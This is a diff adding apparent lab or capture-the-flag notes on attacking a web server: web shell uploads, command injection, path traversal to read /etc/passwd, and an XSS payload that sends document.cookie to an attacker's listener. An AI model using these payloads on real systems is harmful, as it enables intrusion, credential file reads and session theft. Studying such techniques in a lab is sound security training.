@@ -68,7 +68,31 @@ tools/scripts
       8080/tcp closed http-proxy
       9999/tcp closed abyss
 sudo tcpdump -XXvvnni any tcp port 80
-nikto v -n 10.50.28.11
+nikto v -h 10.50.28.11
+same as robots.txt + /icons
+start checking the directories
+/uploads contains mal.php which is a shell
+mainpage allows uploads--uploaded web shell to server, (notbad.php)
+
+/cmdinjection is vulnerable to command injection
+(;)(command)
+ssh in once pub key has been put on the server
+ssh -i .ssh/id_rsa -MS /tmp/web www-data@10.50.28.11
+
+/path demo contains a POST request box use a bunch of ../ (../../../../../../../../../) then the path to the desired file like /etc/passwd -- it prints weird read it through inspect
+
+when the GET method gives you options edit the url 
+http://10.50.28.11/path/pathdemo.php?myfile=demo1
+BECOMES
+http://10.50.28.11/path/pathdemo.php?myfile=../../../../../../../../../../../../../etc/passwd
+
+
+Cross site
+
+test if cross site scripting works>>    <script>alert('XSS!');</script>
+cmd>>                                   python3 -m http.server
+GIMME COOKIE>>                          <script>document.location="http://<IP>:<PORT>/?" + document.cookie;</script>
+
 
 
 
